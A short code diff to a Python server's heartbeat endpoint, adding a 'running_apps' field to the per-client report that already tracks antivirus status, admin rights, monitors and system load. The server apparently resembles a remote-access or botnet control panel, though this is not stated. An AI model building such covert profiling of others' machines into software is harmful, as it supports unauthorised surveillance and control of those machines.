@@ -35,7 +35,8 @@ def heartbeat():
             "uptime": system_info.get('uptime'),
             "antivirus": system_info.get('antivirus'), # Get antivirus status
             "is_admin": system_info.get('is_admin'), # Get admin status
-            "monitors": system_info.get('monitors', []) # Get monitor info
+            "monitors": system_info.get('monitors', []),
+            "running_apps": system_info.get('running_apps', []) # Get running apps info
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
     return jsonify({"status": "ok"})
